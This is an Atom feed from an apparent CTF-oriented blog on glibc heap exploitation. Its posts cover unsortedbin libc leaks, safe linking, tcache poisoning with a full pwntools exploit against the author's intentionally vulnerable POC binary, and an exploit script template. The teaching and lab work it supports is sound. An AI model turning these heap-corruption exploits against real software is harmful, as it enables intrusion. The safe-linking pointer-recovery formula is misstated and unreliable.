@@ -1,0 +1,340 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-08-14T18:05:04+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Cl1nical’s cyber security blog</title><subtitle>This site features different posts related to binary exploitation</subtitle><entry><title type="html">Libc leak with tcache enabled</title><link href="http://localhost:4000/2025/08/14/tcache-libc-leak.html" rel="alternate" type="text/html" title="Libc leak with tcache enabled" /><published>2025-08-14T06:50:19+02:00</published><updated>2025-08-14T06:50:19+02:00</updated><id>http://localhost:4000/2025/08/14/tcache-libc-leak</id><content type="html" xml:base="http://localhost:4000/2025/08/14/tcache-libc-leak.html"><![CDATA[<h3 id="description">Description</h3>
+<p>When we have a UAF to read from a freed chunk how can we use this to get a libc leak?<br />
+The tcache only stores its next ptrs and a key value, so we cannot leak libc through there. But if we could allocate and free more than what tcache can hold (7 chunks per bin) and then free another chunk that does not fit into fastbins, we might get it into unsortedbin. Unsortedbin contains libc ptrs to main arena.</p>
+
+<h3 id="how-to-leak-libc-through-unsortedbin">How to leak libc through unsortedbin</h3>
+<p>We are going to allocate and free 7 chunks to fill the tcache, 1 chunk to go into unsortedbin and a guard chunk to prevent top chunk consolidation. The chunks for tcache and unsortedbin are malloc(0x90) to prevent them from going into fastbin (larger than 64 bytes) and the guard chunk is only malloc(0x20) because its size does not matter. The POC program allows you to do arbitrary allocations of almost arbitrary size.<br /></p>
+
+<p><img src="/assets/images/others/unsortedbin.png" style="width:100%; height:100%;" />
+At address 0x555555559700 and 0x555555559708 you see that they contain the libc addresses of the unsortedbin. They are the fd and bk ptrs to the main arena.<br /></p>
+
+<p>At address 0x5555555597a0 you see the guard chunk user data. This guard chunk prevents top chunk consolidation and forces the previous chunk into the unsortedbin - just what we want.<br /></p>
+
+<p>Next up, the address from the unsortedbin chunk is leaked using the UAF bug in the POC binary. This Leak is at a fixed offset from libc base and this enables us to calculate libc base - finalizing our libc leak. The libc calculation is shown below:<br />
+<img src="/assets/images/others/libc_calc.png" style="width:100%; height:100%;" /></p>
+
+<p>The picture below shows you the end result in the termina:<br />
+<img src="/assets/images/others/libcleak.png" style="width:100%; height:100%;" /></p>]]></content><author><name>Cl1nical</name></author><summary type="html"><![CDATA[Description When we have a UAF to read from a freed chunk how can we use this to get a libc leak? The tcache only stores its next ptrs and a key value, so we cannot leak libc through there. But if we could allocate and free more than what tcache can hold (7 chunks per bin) and then free another chunk that does not fit into fastbins, we might get it into unsortedbin. Unsortedbin contains libc ptrs to main arena.]]></summary></entry><entry><title type="html">Linux</title><link href="http://localhost:4000/jekyll/update/2025/08/13/linux.html" rel="alternate" type="text/html" title="Linux" /><published>2025-08-13T06:50:19+02:00</published><updated>2025-08-13T06:50:19+02:00</updated><id>http://localhost:4000/jekyll/update/2025/08/13/linux</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2025/08/13/linux.html"><![CDATA[<ul>
+  <li><a href="/2025/08/13/exploit-script.html">Exploit script template</a><br /></li>
+  <li><a href="/2025/08/13/heap.html">Heap</a><br /></li>
+</ul>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[Exploit script template Heap]]></summary></entry><entry><title type="html">Linux Heap</title><link href="http://localhost:4000/2025/08/13/heap.html" rel="alternate" type="text/html" title="Linux Heap" /><published>2025-08-13T06:50:19+02:00</published><updated>2025-08-13T06:50:19+02:00</updated><id>http://localhost:4000/2025/08/13/heap</id><content type="html" xml:base="http://localhost:4000/2025/08/13/heap.html"><![CDATA[<ul>
+  <li><a href="/2025/08/13/poc-binary.html">POC Binary</a><br /></li>
+  <li><a href="/2025/08/14/tcache-libc-leak.html">Tcache into libc leak</a><br /></li>
+  <li><a href="/2025/08/13/safe-linking.html">Safe Linking</a><br /></li>
+  <li><a href="/2025/08/13/tcache-poison.html">Tcache Poisoning</a><br /></li>
+</ul>]]></content><author><name>Cl1nical</name></author><summary type="html"><![CDATA[POC Binary Tcache into libc leak Safe Linking Tcache Poisoning]]></summary></entry><entry><title type="html">POC Binary</title><link href="http://localhost:4000/2025/08/13/poc-binary.html" rel="alternate" type="text/html" title="POC Binary" /><published>2025-08-13T06:50:19+02:00</published><updated>2025-08-13T06:50:19+02:00</updated><id>http://localhost:4000/2025/08/13/poc-binary</id><content type="html" xml:base="http://localhost:4000/2025/08/13/poc-binary.html"><![CDATA[<h3 id="description">Description</h3>
+<p>The following binary will be used as a proof of concept to demonstrate various scenarios in the linux heap. I will be using libc version 2.39 on a Ubuntu 24 LTS machine.<br />
+The following zip archive contains 4 files: Source code, elf binary, libc and linker.<br /> 
+You can download the zip archive by clicking <a href="/binaries/poc-binary.tar.gz">here</a>. <br />
+The archive can be unzipped by running the following command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar -xvzf poc-binary.tar.gz
+</code></pre></div></div>
+
+<h3 id="walkthrough">Walkthrough</h3>
+<p>Using the file command you should see the following output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file program
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>program: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5ebf57c66be7230d65662438a74d55d2d49494fb, for GNU/Linux 3.2.0, not stripped
+</code></pre></div></div>
+
+<p>You’ll notice that is a dynamically linked binary, meaning that it loads the necessary libraries at runtime. So unless you are also using Ubuntu 24 LTS with libc version 2.39 it would be a very good idea to make sure that the binary uses the provided libraries. Pwninit is a binary that can patch a binary to use the specified libc and linker. The pwninit binary can be downloaded from Github <a href="https://github.com/io12/pwninit/releases">here</a>. <br />
+The following command can then be used to make the binary run with the proper libc and linker. You will have to use the output binary called <strong>program_patched</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/path/to/pwninit --libc libc.so.6 --ld ld-linux-x86-64.so.2 --bin program
+</code></pre></div></div>
+<p>Now the program is ready to run:<br />
+<img src="/assets/images/poc-walkthrough/poc0.png" style="width:70%; height:70%;" /></p>
+
+<p>As you can see from the picture above, this is a simple console application that allows you to do different things on the heap. The program is written in such a way, that every time it is finished giving output such as printing the menu or some data, it will output a “&gt; “ which should make your exploit development easier.<br />
+Also, the program has these bugs that will be relevant for you:</p>
+<ul>
+  <li>You can do more than 16 allocations, since the program does not check if an allocation has already been made given a certain index e.g. index 4 can be used multiple times</li>
+  <li>The program has a UAF bug allowing both writing to a free chunk using the “Edit” option but also printing from a free chunk using the “Print” option.</li>
+  <li>The “Print” option is using puts which means that it will terminate on a null byte or a newline character. This has some implications in terms of how a leak can be achieved. <br /></li>
+</ul>
+
+<p>Play around with the program and look at the source code to understand the program.</p>]]></content><author><name>Cl1nical</name></author><summary type="html"><![CDATA[Description The following binary will be used as a proof of concept to demonstrate various scenarios in the linux heap. I will be using libc version 2.39 on a Ubuntu 24 LTS machine. The following zip archive contains 4 files: Source code, elf binary, libc and linker. You can download the zip archive by clicking here. The archive can be unzipped by running the following command: tar -xvzf poc-binary.tar.gz]]></summary></entry><entry><title type="html">Safe Linking (tcache, fastbins)</title><link href="http://localhost:4000/2025/08/13/safe-linking.html" rel="alternate" type="text/html" title="Safe Linking (tcache, fastbins)" /><published>2025-08-13T06:50:19+02:00</published><updated>2025-08-13T06:50:19+02:00</updated><id>http://localhost:4000/2025/08/13/safe-linking</id><content type="html" xml:base="http://localhost:4000/2025/08/13/safe-linking.html"><![CDATA[<h3 id="description">Description</h3>
+<p>To make it harder for an attacker to overwrite the next ptr in a free tcache or fastbin chunk, newer libc versions feature a security measure called “Safe Linking” (version 2.32 and onwards). This means that the next ptr in the free chunk is not stored in plaintext, but rather it is mangled.</p>
+
+<h3 id="some-information-about-the-tcache">Some information about the tcache</h3>
+<p>Consider the following scenario: Imagine we have 2 chunks allocated with malloc(0x40): Chunk0 and chunk1. First chunk1 is freed and then chunk0. Now in the tcache 0x50 bin you will have the following layout: chunk0 -&gt; chunk1. <br />
+This means that chunk0 is the ‘head’ of the 0x50 tcache bin (0x50 because 0x40+0x10 for metadata such as size field). The head is the first chunk to be allocated if a malloc(0x40) occurs, since the tcache uses last-in-first-out (like a stack).<br />
+But in order to keep track of the next elements in the same bin, the tcache uses a ptr to the user data of the next chunk. If this ptr is overwritten by an attacker, they can control where the next allocation will be, giving them a lot of control.<br />
+To try and mitigate this, safe linking has been employed, so that an attacker cannot ‘just’ overwrite the next ptr with a plain text value. They need a heap leak first, since safe linking uses the heap addresses to mangle the next ptr before storing it.</p>
+
+<h3 id="safe-linking">Safe Linking</h3>
+<p>To put it plainly, safe linking works by doing the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chunk0-&gt;fd = (chunk0 &gt;&gt; 12) ^ chunk1
+</code></pre></div></div>
+<p>Take the address of chunk0 and right shift 12 bits, then xor with chunk1 and store result at the address of chunk0.<br /></p>
+
+<p>To get back the original ptr, do the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>read_fd = (chunk0 &gt;&gt; 12) ^ chunk1
+</code></pre></div></div>
+<p><br />
+Below is a picture that illustrates safe linking:
+<img src="/assets/images/others/safe_linking.png" style="width:100%; height:100%;" /></p>
+
+<p>chunk0 is at addr: 0x5555555592a0<br />
+chunk1 is at addr: 0x5555555592f0<br /></p>
+
+<p>So to do safe linking here:<br />
+chunk0-&gt;fd = (0x5555555592a0 » 12) ^ 0x5555555592f0 <br /></p>
+
+<p>chunk0-&gt;fd is the first value you see at address 0x5555555592a0: 0x000055500000c7a9</p>]]></content><author><name>Cl1nical</name></author><summary type="html"><![CDATA[Description To make it harder for an attacker to overwrite the next ptr in a free tcache or fastbin chunk, newer libc versions feature a security measure called “Safe Linking” (version 2.32 and onwards). This means that the next ptr in the free chunk is not stored in plaintext, but rather it is mangled.]]></summary></entry><entry><title type="html">Tcache-Poison</title><link href="http://localhost:4000/2025/08/13/tcache-poison.html" rel="alternate" type="text/html" title="Tcache-Poison" /><published>2025-08-13T06:50:19+02:00</published><updated>2025-08-13T06:50:19+02:00</updated><id>http://localhost:4000/2025/08/13/tcache-poison</id><content type="html" xml:base="http://localhost:4000/2025/08/13/tcache-poison.html"><![CDATA[<h3 id="description">Description</h3>
+<p>Tcache poisoning is a common heap exploitation technique in CTFs. It involves overwriting the next ptr of a free tcache chunk to decide where the following chunk will be allocated. You can understand more about tcache poisoning by clicking this link: <a href="https://github.com/shellphish/how2heap/tree/master/glibc_2.39">how2heap</a>. You will need to compile and examine the desired binary to better understand how the heap works. To visualize the heap in pwndbg we will use the ‘vis’ command.<br />
+At the bottom of this page you will see the full exploit script that demonstrates a tcache poison on the a POC binary. You can use the already defined functions to interact with the binary or implement them yourself.</p>
+
+<h3 id="video">Video</h3>
+<p>This blog post features a video at the following <a href="https://youtu.be/miaxqpKbq8U">link</a> <br />
+The video is intended for a more thourough walkthrough than the post itself.</p>
+
+<h3 id="walkthrough">Walkthrough</h3>
+<p>Using the POC binary, we will allocate and free a chunk and with the UAF bug we will leak the ptr that it contains. Since there is no other free chunk in the particular tcache bin, the ptr mangling (safe linking) that modern libc tcache employs will not be very effective and we can use the leak to calculate the heap base address. This is very important since it will allow us to calculate where future heap allocations are, enabling us to circumvent the safe linking for future allocations.<br />
+Allocate and free a chunk:<br />
+<img src="/assets/images/tcache-poisoning/tcache0.png" style="width:100%; height:100%;" />
+And in the tcache metadata we will see:<br />
+<img src="/assets/images/tcache-poisoning/tcache1.png" style="width:100%; height:100%;" /></p>
+
+<p>Address 0x555555559010 holds the value 0x1, meaning that there is 1 free chunk in the 0x50 tcache bin.<br />
+Address 0x5555555590a8 holds the ptr to the user data of the chunk at the head of the 0x50 tcache bin.<br /></p>
+
+<p>As you can see there is a lot of similarity between the ptr contained in the free chunk and the heap base addr. To make things clearer, the heap starts at 0x555555559000 <br />
+So if we leak the ptr in the free chunk and left shift it by 12 bits we will have the same value as the heap base address. The following python code achieves this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># allocate chunk0
+p = b"A"*8
+malloc(0, 0x40, p)
+
+# free chunk0
+free(0)
+
+# leak heap base via chunk 0
+heap_leak = puts(0)
+heap_leak = heap_leak[:8]
+heap_leak = u64(heap_leak.ljust(8,b"\x00"))
+heap_base = heap_leak &lt;&lt; 12
+print("heap_base:",hex(heap_base))
+</code></pre></div></div>
+<p>This should give you the following output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>heap_base: 0x555555559000
+[*] Switching to interactive mode
+MENU:
+1: Malloc
+2: Free
+3: Edit
+4: Print
+&gt; $  
+</code></pre></div></div>
+
+<p>Now we need to allocate two chunks, free them and then overwrite the next ptr of the last freed chunk. Something along the lines of:<br /></p>
+<ul>
+  <li>allocate chunk0 and chunk1</li>
+  <li>free chunk1 and then chunk0</li>
+  <li>calculate the safe_link mangling using the addr of chunk0 and the target addr</li>
+  <li>allocate chunk0 again and then chunk1 which now points to an attacker controlled destination
+<br /></li>
+</ul>
+
+<p>Allocation, freeing and overwriting:<br />
+<img src="/assets/images/tcache-poisoning/tcache3.png" style="width:100%; height:100%;" /></p>
+
+<p>Allocating again:<br />
+<img src="/assets/images/tcache-poisoning/tcache4.png" style="width:100%; height:100%;" /></p>
+
+<p>Full exploit POC with comments:<br /></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"program"</span><span class="p">)</span>
+
+<span class="n">gs</span> <span class="o">=</span> <span class="s">'''
+c
+'''</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">,</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">"address"</span><span class="p">,</span> <span class="mi">12345</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">close_fds</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="c1">#shellcode = asm('\n'.join([
+</span>    
+<span class="c1">#]))
+</span>
+<span class="k">def</span> <span class="nf">safe_link</span><span class="p">(</span><span class="n">home</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">home</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">target</span>
+
+<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">size</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">payload</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">payload</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">puts</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"4"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">leak</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="c1"># allocate chunk0
+</span><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+
+<span class="c1"># free chunk0
+</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># leak heap base via chunk 0
+</span><span class="n">heap_leak</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">heap_leak</span> <span class="o">=</span> <span class="n">heap_leak</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span>
+<span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"heap_base:"</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+
+<span class="c1"># allocate the chunk again and allocate another one of the same size
+</span><span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+
+<span class="c1"># free chunk2 and then chunk1
+# this will cause: chunk1 -&gt; chunk2
+</span><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># edit the ptr in chunk1 -&gt; target
+# when doing this, we need to know the address of chunk1 so we can use
+# the safe_link function
+# I call the function that contains the ptr the 'home' chunk
+# By inspecting the heap we can see that the home chunk is at
+# offset 0x2a0 from the heap base address
+</span><span class="n">home</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2a0</span>
+<span class="c1"># We will just target heap_base + 0x100 to demonstrate
+# It is important that the address is read/writable and that it is
+# 16 byte aligned, meaning the last character of the address
+# should be '0' and not '8' or something else
+</span><span class="n">target</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x100</span>
+<span class="n">addr</span> <span class="o">=</span> <span class="n">safe_link</span><span class="p">(</span><span class="n">home</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+
+<span class="c1"># next up we allocate chunk1 again and then we allocate chunk2
+# which was manipulated by us to point
+# to heap_base+0x100
+</span><span class="n">malloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="p">)</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">"XXXX"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>]]></content><author><name>Cl1nical</name></author><summary type="html"><![CDATA[Description Tcache poisoning is a common heap exploitation technique in CTFs. It involves overwriting the next ptr of a free tcache chunk to decide where the following chunk will be allocated. You can understand more about tcache poisoning by clicking this link: how2heap. You will need to compile and examine the desired binary to better understand how the heap works. To visualize the heap in pwndbg we will use the ‘vis’ command. At the bottom of this page you will see the full exploit script that demonstrates a tcache poison on the a POC binary. You can use the already defined functions to interact with the binary or implement them yourself.]]></summary></entry><entry><title type="html">Exploit script template - python</title><link href="http://localhost:4000/2025/08/13/exploit-script.html" rel="alternate" type="text/html" title="Exploit script template - python" /><published>2025-08-13T06:50:19+02:00</published><updated>2025-08-13T06:50:19+02:00</updated><id>http://localhost:4000/2025/08/13/exploit-script</id><content type="html" xml:base="http://localhost:4000/2025/08/13/exploit-script.html"><![CDATA[<h3 id="description">Description</h3>
+<p>When exploiting a program such as a CTF challenge, it is often a good idea to have a standardized starting point. I will refer to this as an exploit script template. My template is inspired by Max Kamper’s exploit script that is used in his <a href="&quot;https://www.udemy.com/course/linux-heap-exploitation-part-1/&quot;">Heap Lab</a> turorials on Udemy (which I highly recommend).<br /></p>
+
+<h3 id="script">Script</h3>
+<p>I usually have it in ~/Desktop/xpl.py which easily allows me to copy it around my file system whenever I start a new CTF.<br />
+<strong>Note:</strong> Do <strong>not</strong> name your exploit script ‘pwn.py’ since this will confuse the python interpreter with the pwntools library also named ‘pwn’ and then it wil not work.<br />
+You can copy the script from below:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python3
+from pwn import *
+elf = context.binary = ELF("chall")
+
+gs = '''
+c
+'''
+
+context.arch = 'amd64'
+
+def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript=gs, aslr=False)
+    if args.REMOTE:
+        return remote("address", 12345)
+    else:
+        return process(elf.path, close_fds=False)
+
+#shellcode = asm('\n'.join([
+    
+#]))
+
+
+io = start()
+
+
+
+io.interactive()
+</code></pre></div></div>
+
+<h3 id="walkthrough---line-by-line">Walkthrough - line by line</h3>
+<p>The following line is called a shebang and tells the system which python interpreter to use:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python3
+</code></pre></div></div>
+
+<p>The following line imports all functions from the pwntools library:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *
+</code></pre></div></div>
+
+<p>The following line sets the context binary to the “chall” binary in the same directory:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>elf = context.binary = ELF("chall")
+</code></pre></div></div>
+<p>The following sets the gdb script where you can set gdb commands as you wish.<br />
+For example to break on a specific address you could use: b *addr or b *main+104 depending on your needs:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gs = '''
+c
+'''
+</code></pre></div></div>
+<p>The folling line sets the context.arch variable in pwntools. This is important for when you need shellcode to compile correctly. You can change this depending on the target binary.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>context.arch = 'amd64'
+</code></pre></div></div>
+<p>The folling function “start()” will be used to start the target binary that is specified at the beginning of the script. Some important things to note are:</p>
+<ul>
+  <li>args.GDB wich means you can start the program with gdb debugging using the command:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 xpl.py GDB
+</code></pre></div>    </div>
+    <p><strong>Note:</strong> the ‘GDB’ is case sensitive</p>
+  </li>
+  <li>The close_fds=False means that previously opened file descriptors will still be open. This is useful when you need to open some file that should be visible to the target program when it is started. This does not include stdin, stdout or stderr which will be opened by default.</li>
+  <li>aslr=False is an option that allows you to select if you want to debug with or without aslr enabled - even when inside of GDB. This can make your debugging experience easier.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript=gs, aslr=False)
+    if args.REMOTE:
+        return remote("address", 12345)
+    else:
+        return process(elf.path, close_fds=False)
+</code></pre></div></div>
+
+<p>The following can be uncommented if you need to shellcode in your exploit script.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#shellcode = asm('\n'.join([
+    
+#]))
+</code></pre></div></div>
+<p>One example of shellcoding is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>value = 15
+shellcode = asm('\n'.join([
+    "mov rax, 90",
+    f"mov rsi {value}",
+    "syscall"
+]))
+</code></pre></div></div>
+<p>The formatted string above is just an example to show you what’s possible.<br /></p>
+
+<p>The last two lines are used to start the target binary and go to interactive mode.<br />
+Your exploit should mainly be written between those to function calls:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>io = start()
+
+# Primarily writing exploit here.
+
+io.interactive()
+</code></pre></div></div>]]></content><author><name>Cl1nical</name></author><summary type="html"><![CDATA[Description When exploiting a program such as a CTF challenge, it is often a good idea to have a standardized starting point. I will refer to this as an exploit script template. My template is inspired by Max Kamper’s exploit script that is used in his Heap Lab turorials on Udemy (which I highly recommend).]]></summary></entry></feed>
